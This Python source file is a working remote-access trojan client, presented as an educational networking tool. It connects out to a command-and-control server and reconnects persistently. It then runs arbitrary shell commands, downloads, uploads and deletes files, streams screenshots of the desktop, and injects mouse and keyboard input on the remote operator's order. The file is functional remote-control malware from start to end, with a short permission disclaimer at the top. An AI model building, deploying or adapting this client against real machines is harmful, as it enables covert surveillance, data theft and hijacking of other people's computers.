#!/usr/bin/env python3
"""
Educational Remote Administration Tool (RAT) client.

This script is intentionally simple and is meant ONLY for learning about
basic client/server networking concepts. Do NOT run this against any
system or network you do not own or have explicit permission to test.

Usage (example, from the machine being controlled):
    python rat.py --host 127.0.0.1 --port 9001

Then run the CNC server on your own machine and connect to it.
"""

from __future__ import annotations

import base64
import io
import json
import os
import socket
import subprocess
import sys
import threading
import time
from typing import Any, Dict, Optional

import typer


DEFAULT_RECONNECT_DELAY = 5.0  # seconds (can be overridden via config)
DEFAULT_HEARTBEAT_INTERVAL = 20.0  # seconds (can be overridden via config)
DEFAULT_DESKTOP_FPS = 5.0  # frames per second for desktop streaming
DEFAULT_DESKTOP_QUALITY = 70  # JPEG quality default
DEFAULT_DESKTOP_SCALE = 1.0   # 1.0 = original size


def send_json_line(sock: socket.socket, payload: Dict[str, Any]) -> None:
    """
    Send a single JSON object, newline-terminated.
    """
    data = (json.dumps(payload) + "\n").encode("utf-8", errors="ignore")
    sock.sendall(data)


def recv_json_line(sock: socket.socket) -> Dict[str, Any] | None:
    """
    Receive a single JSON object, assuming newline-delimited messages.
    Returns None if the connection is closed.
    """
    chunks: list[bytes] = []
    while True:
        chunk = sock.recv(1)
        if not chunk:
            # connection closed
            if not chunks:
                return None
            break
        if chunk == b"\n":
            break
        chunks.append(chunk)
    raw = b"".join(chunks).decode("utf-8", errors="ignore").strip()
    if not raw:
        return None
    try:
        return json.loads(raw)
    except json.JSONDecodeError:
        return None


def run_command(cmd: str, cwd: str | None = None) -> Dict[str, Any]:
    """
    Run a shell command and capture stdout, stderr and exit code.
    """
    try:
        completed = subprocess.run(
            cmd,
            shell=True,
            cwd=cwd,
            capture_output=True,
            text=True,
        )
        return {
            "ok": True,
            "stdout": completed.stdout,
            "stderr": completed.stderr,
            "returncode": completed.returncode,
        }
    except Exception as exc:  # pragma: no cover - defensive
        return {"ok": False, "error": repr(exc)}


def capture_screenshot(
    *,
    scale: float = DEFAULT_DESKTOP_SCALE,
    quality: int = DEFAULT_DESKTOP_QUALITY,
    fmt: str = "jpeg",
    region: Optional[tuple[int, int, int, int]] = None,
) -> Optional[str]:
    """
    Capture a screenshot and return it as a base64-encoded JPEG string.
    Returns None if screenshot capture fails.
    """
    try:
        if sys.platform == "win32":
            try:
                from PIL import ImageGrab
                img = ImageGrab.grab(bbox=region)
            except ImportError:
                return None
        elif sys.platform.startswith("linux"):
            try:
                import subprocess
                # Try using gnome-screenshot, scrot, or import
                for cmd in ["gnome-screenshot", "scrot", "import"]:
                    try:
                        if cmd == "import":
                            # ImageMagick import
                            result = subprocess.run(
                                ["import", "-window", "root", "png:-"],
                                capture_output=True,
                                timeout=2
                            )
                            if result.returncode == 0:
                                from PIL import Image
                                img = Image.open(io.BytesIO(result.stdout))
                                break
                        else:
                            result = subprocess.run(
                                [cmd, "-f", "/tmp/pyrat_screenshot.png"],
                                capture_output=True,
                                timeout=2
                            )
                            if result.returncode == 0:
                                from PIL import Image
                                img = Image.open("/tmp/pyrat_screenshot.png")
                                os.remove("/tmp/pyrat_screenshot.png")
                                break
                    except (FileNotFoundError, subprocess.TimeoutExpired, OSError):
                        continue
                else:
                    return None
            except Exception:
                return None
        elif sys.platform == "darwin":
            try:
                from PIL import ImageGrab
                img = ImageGrab.grab(bbox=region)
            except ImportError:
                return None
        else:
            return None

        # Optional scale
        try:
            if scale and scale > 0 and scale != 1.0:
                from PIL import Image
                new_w = max(1, int(img.width * scale))
                new_h = max(1, int(img.height * scale))
                img = img.resize((new_w, new_h), Image.Resampling.LANCZOS)
        except Exception:
            pass

        # Convert to desired format and encode as base64
        buffer = io.BytesIO()
        if fmt.lower() == "png":
            img.save(buffer, format="PNG", optimize=True)
        else:
            q = max(10, min(95, int(quality)))
            img.save(buffer, format="JPEG", quality=q, optimize=True)
        img_bytes = buffer.getvalue()
        return base64.b64encode(img_bytes).decode("utf-8")
    except Exception:
        return None


def desktop_stream_loop(
    sock: socket.socket,
    stop_event: threading.Event,
    fps: float,
    *,
    scale: float = DEFAULT_DESKTOP_SCALE,
    quality: int = DEFAULT_DESKTOP_QUALITY,
    fmt: str = "jpeg",
    region: Optional[tuple[int, int, int, int]] = None,
) -> None:
    """
    Continuously capture and send screenshots at the specified FPS.
    """
    interval = 1.0 / fps
    while not stop_event.is_set():
        screenshot_b64 = capture_screenshot(scale=scale, quality=quality, fmt=fmt, region=region)
        if screenshot_b64:
            try:
                send_json_line(
                    sock,
                    {
                        "type": "desktop_frame",
                        "image": screenshot_b64,
                        "format": fmt,
                    },
                )
            except OSError:
                break
        stop_event.wait(interval)


def heartbeat_loop(
    sock: socket.socket, stop_event: threading.Event, interval: float
) -> None:
    """
    Periodically send a small heartbeat so the server can see we're alive.
    """
    while not stop_event.is_set():
        try:
            send_json_line(sock, {"type": "heartbeat", "cwd": os.getcwd()})
        except OSError:
            break
        stop_event.wait(interval)


def client_loop(host: str, port: int, reconnect_delay: float, hb_interval: float) -> None:
    """
    Connect to the CNC server and process commands.
    """
    while True:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        try:
            sock.connect((host, port))
        except OSError as exc:
            print(f"[rat] Failed to connect to {host}:{port}: {exc}", file=sys.stderr)
            time.sleep(reconnect_delay)
            continue

        print(f"[rat] Connected to CNC at {host}:{port}")
        stop_event = threading.Event()
        desktop_stop_event = threading.Event()
        desktop_thread: Optional[threading.Thread] = None
        hb_thread = threading.Thread(
            target=heartbeat_loop,
            args=(sock, stop_event, hb_interval),
            daemon=True,
        )
        hb_thread.start()

        # Send initial hello
        hello_payload = {
            "type": "hello",
            "hostname": socket.gethostname(),
            "cwd": os.getcwd(),
            "platform": sys.platform,
            "pid": os.getpid(),
        }
        try:
            send_json_line(sock, hello_payload)
        except OSError:
            sock.close()
            continue

        try:
            while True:
                msg = recv_json_line(sock)
                if msg is None:
                    print("[rat] CNC disconnected")
                    break

                msg_type = msg.get("type")

                if msg_type == "ping":
                    send_json_line(sock, {"type": "pong"})
                elif msg_type == "desktop_start":
                    fps = float(msg.get("fps", DEFAULT_DESKTOP_FPS))
                    quality = int(msg.get("quality", DEFAULT_DESKTOP_QUALITY))
                    scale = float(msg.get("scale", DEFAULT_DESKTOP_SCALE))
                    fmt = str(msg.get("format", "jpeg")).lower()
                    region = msg.get("region")
                    # region should be [x1,y1,x2,y2]
                    if isinstance(region, list) and len(region) == 4:
                        try:
                            region = (int(region[0]), int(region[1]), int(region[2]), int(region[3]))
                        except Exception:
                            region = None
                    else:
                        region = None
                    desktop_stop_event.clear()
                    desktop_thread = threading.Thread(
                        target=desktop_stream_loop,
                        args=(sock, desktop_stop_event, fps),
                        kwargs={"scale": scale, "quality": quality, "fmt": fmt, "region": region},
                        daemon=True,
                    )
                    desktop_thread.start()
                    send_json_line(sock, {"type": "desktop_started", "fps": fps, "quality": quality, "scale": scale, "format": fmt})
                elif msg_type == "desktop_stop":
                    desktop_stop_event.set()
                    send_json_line(sock, {"type": "desktop_stopped"})
                elif msg_type == "desktop_frame":
                    # Single screenshot request
                    quality = int(msg.get("quality", DEFAULT_DESKTOP_QUALITY))
                    scale = float(msg.get("scale", DEFAULT_DESKTOP_SCALE))
                    fmt = str(msg.get("format", "jpeg")).lower()
                    region = msg.get("region")
                    if isinstance(region, list) and len(region) == 4:
                        try:
                            region = (int(region[0]), int(region[1]), int(region[2]), int(region[3]))
                        except Exception:
                            region = None
                    else:
                        region = None
                    screenshot_b64 = capture_screenshot(scale=scale, quality=quality, fmt=fmt, region=region)
                    if screenshot_b64:
                        send_json_line(
                            sock,
                            {
                                "type": "desktop_frame",
                                "image": screenshot_b64,
                                "format": fmt,
                            },
                        )
                    else:
                        send_json_line(
                            sock,
                            {"type": "desktop_frame_error", "error": "Screenshot capture failed"},
                        )
                elif msg_type == "list_dir":
                    path = msg.get("path") or os.getcwd()
                    try:
                        items = []
                        with os.scandir(path) as it:
                            for entry in it:
                                try:
                                    stat = entry.stat()
                                    items.append({
                                        "name": entry.name,
                                        "is_dir": entry.is_dir(),
                                        "size": stat.st_size,
                                        "mtime": stat.st_mtime,
                                    })
                                except OSError:
                                    items.append({"name": entry.name, "is_dir": entry.is_dir(), "size": None, "mtime": None})
                        send_json_line(sock, {"type": "list_dir_result", "path": path, "items": items})
                    except OSError as exc:
                        send_json_line(sock, {"type": "list_dir_error", "path": path, "error": str(exc)})
                elif msg_type == "download":
                    path = msg.get("path") or ""
                    try:
                        with open(path, "rb") as f:
                            data_b64 = base64.b64encode(f.read()).decode("utf-8")
                        send_json_line(sock, {"type": "download_result", "path": path, "data": data_b64})
                    except OSError as exc:
                        send_json_line(sock, {"type": "download_error", "path": path, "error": str(exc)})
                elif msg_type == "upload":
                    path = msg.get("path") or ""
                    data_b64 = msg.get("data") or ""
                    try:
                        data = base64.b64decode(data_b64)
                        with open(path, "wb") as f:
                            f.write(data)
                        send_json_line(sock, {"type": "upload_result", "path": path, "ok": True})
                    except Exception as exc:
                        send_json_line(sock, {"type": "upload_error", "path": path, "error": str(exc)})
                elif msg_type == "mkdir":
                    path = msg.get("path") or ""
                    try:
                        os.makedirs(path, exist_ok=True)
                        send_json_line(sock, {"type": "mkdir_result", "path": path, "ok": True})
                    except OSError as exc:
                        send_json_line(sock, {"type": "mkdir_error", "path": path, "error": str(exc)})
                elif msg_type == "rm":
                    path = msg.get("path") or ""
                    try:
                        if os.path.isdir(path):
                            os.rmdir(path)
                        else:
                            os.remove(path)
                        send_json_line(sock, {"type": "rm_result", "path": path, "ok": True})
                    except OSError as exc:
                        send_json_line(sock, {"type": "rm_error", "path": path, "error": str(exc)})
                elif msg_type == "mv":
                    src = msg.get("src") or ""
                    dst = msg.get("dst") or ""
                    try:
                        os.replace(src, dst)
                        send_json_line(sock, {"type": "mv_result", "src": src, "dst": dst, "ok": True})
                    except OSError as exc:
                        send_json_line(sock, {"type": "mv_error", "src": src, "dst": dst, "error": str(exc)})
                elif msg_type == "mouse_move":
                    # Mouse movement command
                    x = msg.get("x")
                    y = msg.get("y")
                    if x is not None and y is not None:
                        try:
                            if sys.platform == "win32":
                                import ctypes
                                ctypes.windll.user32.SetCursorPos(int(x), int(y))
                            elif sys.platform.startswith("linux"):
                                try:
                                    subprocess.run(
                                        ["xdotool", "mousemove", str(int(x)), str(int(y))],
                                        timeout=1,
                                        capture_output=True,
                                    )
                                except (FileNotFoundError, subprocess.TimeoutExpired):
                                    pass
                            elif sys.platform == "darwin":
                                try:
                                    subprocess.run(
                                        ["cliclick", "m:", str(int(x)), str(int(y))],
                                        timeout=1,
                                        capture_output=True,
                                    )
                                except (FileNotFoundError, subprocess.TimeoutExpired):
                                    pass
                            send_json_line(sock, {"type": "mouse_move_result", "ok": True})
                        except Exception:
                            send_json_line(sock, {"type": "mouse_move_result", "ok": False})
                elif msg_type == "mouse_click":
                    # Mouse click command
                    button = msg.get("button", "left")  # left, right, middle
                    try:
                        if sys.platform == "win32":
                            import ctypes
                            if button == "left":
                                ctypes.windll.user32.mouse_event(2, 0, 0, 0, 0)  # MOUSEEVENTF_LEFTDOWN
                                ctypes.windll.user32.mouse_event(4, 0, 0, 0, 0)  # MOUSEEVENTF_LEFTUP
                            elif button == "right":
                                ctypes.windll.user32.mouse_event(8, 0, 0, 0, 0)  # MOUSEEVENTF_RIGHTDOWN
                                ctypes.windll.user32.mouse_event(16, 0, 0, 0, 0)  # MOUSEEVENTF_RIGHTUP
                        elif sys.platform.startswith("linux"):
                            try:
                                btn_map = {"left": "1", "right": "3", "middle": "2"}
                                subprocess.run(
                                    ["xdotool", "click", btn_map.get(button, "1")],
                                    timeout=1,
                                    capture_output=True,
                                )
                            except (FileNotFoundError, subprocess.TimeoutExpired):
                                pass
                        elif sys.platform == "darwin":
                            try:
                                btn_map = {"left": "1", "right": "2", "middle": "3"}
                                subprocess.run(
                                    ["cliclick", "c:", btn_map.get(button, "1")],
                                    timeout=1,
                                    capture_output=True,
                                )
                            except (FileNotFoundError, subprocess.TimeoutExpired):
                                pass
                        send_json_line(sock, {"type": "mouse_click_result", "ok": True})
                    except Exception:
                        send_json_line(sock, {"type": "mouse_click_result", "ok": False})
                elif msg_type == "key_press":
                    # Keyboard input command
                    key = msg.get("key")
                    if key:
                        try:
                            if sys.platform == "win32":
                                import ctypes
                                # Simple key press simulation (limited)
                                vk_code = ord(key.upper()) if len(key) == 1 else 0
                                if vk_code:
                                    ctypes.windll.user32.keybd_event(vk_code, 0, 0, 0)
                                    ctypes.windll.user32.keybd_event(vk_code, 0, 2, 0)
                            elif sys.platform.startswith("linux"):
                                try:
                                    subprocess.run(
                                        ["xdotool", "key", key],
                                        timeout=1,
                                        capture_output=True,
                                    )
                                except (FileNotFoundError, subprocess.TimeoutExpired):
                                    pass
                            elif sys.platform == "darwin":
                                try:
                                    subprocess.run(
                                        ["cliclick", "k:", key],
                                        timeout=1,
                                        capture_output=True,
                                    )
                                except (FileNotFoundError, subprocess.TimeoutExpired):
                                    pass
                            send_json_line(sock, {"type": "key_press_result", "ok": True})
                        except Exception:
                            send_json_line(sock, {"type": "key_press_result", "ok": False})
                elif msg_type == "exec":
                    cmd = msg.get("cmd") or ""
                    resp = run_command(cmd)
                    send_json_line(
                        sock,
                        {
                            "type": "exec_result",
                            "cmd": cmd,
                            "result": resp,
                            "cwd": os.getcwd(),
                        },
                    )
                elif msg_type == "cd":
                    path = msg.get("path") or ""
                    try:
                        os.chdir(path)
                        ok = True
                        err = ""
                    except OSError as exc:
                        ok = False
                        err = str(exc)
                    send_json_line(
                        sock,
                        {
                            "type": "cd_result",
                            "ok": ok,
                            "error": err,
                            "cwd": os.getcwd(),
                        },
                    )
                elif msg_type == "pwd":
                    send_json_line(sock, {"type": "pwd_result", "cwd": os.getcwd()})
                elif msg_type == "exit":
                    print("[rat] Received exit command, closing.")
                    desktop_stop_event.set()
                    send_json_line(sock, {"type": "bye"})
                    sock.close()
                    return
                else:
                    # Unknown command
                    send_json_line(
                        sock,
                        {
                            "type": "error",
                            "error": f"Unknown command type: {msg_type!r}",
                        },
                    )
        finally:
            stop_event.set()
            desktop_stop_event.set()
            try:
                sock.close()
            except OSError:
                pass

        # Try to reconnect after a delay
        time.sleep(DEFAULT_RECONNECT_DELAY)


def load_config() -> Dict[str, Any]:
    """
    Load configuration from config.json in the same directory as this script,
    if it exists. Returns an empty dict if it cannot be loaded.
    """
    path = os.path.join(os.path.dirname(__file__), "config.json")
    try:
        with open(path, "r", encoding="utf-8") as f:
            return json.load(f)
    except OSError:
        return {}
    except json.JSONDecodeError:
        # Ignore invalid config to keep the client running
        return {}


app = typer.Typer(help="Educational RAT client that connects to a CNC server.")


@app.command()
def cli(
    host: str = typer.Option(None, help="CNC server hostname or IP (overrides config.json if provided)"),
    port: int = typer.Option(None, help="CNC server TCP port (overrides config.json if provided)"),
    reconnect_delay: float = typer.Option(None, "--reconnect-delay", help="Seconds to wait before reconnecting (overrides config.json if provided)"),
    heartbeat_interval: float = typer.Option(None, "--heartbeat-interval", help="Seconds between heartbeat messages (overrides config.json if provided)"),
) -> None:
    """Run the RAT client."""
    main_with_args(host, port, reconnect_delay, heartbeat_interval)


def main_with_args(
    host: str | None = None,
    port: int | None = None,
    reconnect_delay: float | None = None,
    heartbeat_interval: float | None = None,
) -> None:
    cfg = load_config()
    client_cfg = cfg.get("client") if isinstance(cfg, dict) else {}

    host_cfg = client_cfg.get("host") if isinstance(client_cfg, dict) else None
    host = host or (host_cfg if host_cfg else "127.0.0.1")

    port_cfg = client_cfg.get("port") if isinstance(client_cfg, dict) else None
    port = port if port is not None else (int(port_cfg) if port_cfg is not None else 9001)

    rd_cfg = client_cfg.get("reconnect_delay") if isinstance(client_cfg, dict) else None
    reconnect_delay = (
        reconnect_delay
        if reconnect_delay is not None
        else (float(rd_cfg) if rd_cfg is not None else DEFAULT_RECONNECT_DELAY)
    )

    hb_cfg = client_cfg.get("heartbeat_interval") if isinstance(client_cfg, dict) else None
    hb_interval = (
        heartbeat_interval
        if heartbeat_interval is not None
        else (float(hb_cfg) if hb_cfg is not None else DEFAULT_HEARTBEAT_INTERVAL)
    )

    client_loop(host, port, reconnect_delay, hb_interval)


if __name__ == "__main__":
    app()


